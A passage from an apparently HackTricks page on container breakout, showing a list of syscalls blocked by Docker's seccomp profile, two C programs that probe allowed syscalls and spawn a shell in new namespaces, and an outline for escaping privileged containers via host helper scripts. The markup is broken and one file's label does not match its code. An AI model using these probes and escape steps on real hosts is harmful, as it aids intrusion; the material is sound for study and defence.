- [Capabilities in Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <fcntl.h>

#define STACK_SIZE (1024 * 1024)

static char child_stack[STACK_SIZE];

static int child_fn() {
  // Unshare the mount namespace
  if (unshare(CLONE_NEWNS) != 0) {
    perror("unshare(CLONE_NEWNS)");
    exit(EXIT_FAILURE);
  }

  // Mount /proc in the new namespace
  if (mount("proc", "/proc", "proc", 0, NULL) != 0) {
    perror("mount(/proc)");
    exit(EXIT_FAILURE);
  }

  // Open a new shell
  char *shell = "/bin/bash";
  char *args[] = {shell, NULL};
  if (execvp(shell, args) != 0) {
    perror("execvp");
    exit(EXIT_FAILURE);
  }
}

int main() {
  // Fork a new process with a new stack
  pid_t child_pid = clone(child_fn, child_stack + STACK_SIZE, CLONE_NEWPID | SIGCHLD, NULL);
  if (child_pid == -1) {
    perror("clone");
    exit(EXIT_FAILURE);
  }

  // Wait for the child process to exit
  if (waitpid(child_pid, NULL, 0) == -1) {
    perror("waitpid");
    exit(EXIT_FAILURE);
  }

  return 0;
}
```

{% endtab %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
    for(int i = 0; i < 333; ++i)
    {
        if(i == SYS_rt_sigreturn) continue;
        if(i == SYS_select) continue;
        if(i == SYS_pause) continue;
        if(i == SYS_exit_group) continue;
        if(i == SYS_exit) continue;
        if(i == SYS_clone) continue;
        if(i == SYS_fork) continue;
        if(i == SYS_vfork) continue;
        if(i == SYS_pselect6) continue;
        if(i == SYS_ppoll) continue;
        if(i == SYS_seccomp) continue;
        if(i == SYS_vhangup) continue;
        if(i == SYS_reboot) continue;
        if(i == SYS_shutdown) continue;
        if(i == SYS_msgrcv) continue;
        printf("Probando: 0x%03x . . . ", i); fflush(stdout);
        if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
            printf("Error\n");
        else
            printf("OK\n");
    }
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
  * You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
  * You should be able to **execute the trigger from inside the host**
  * You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
  * You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

![](../../docker-breakout/.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
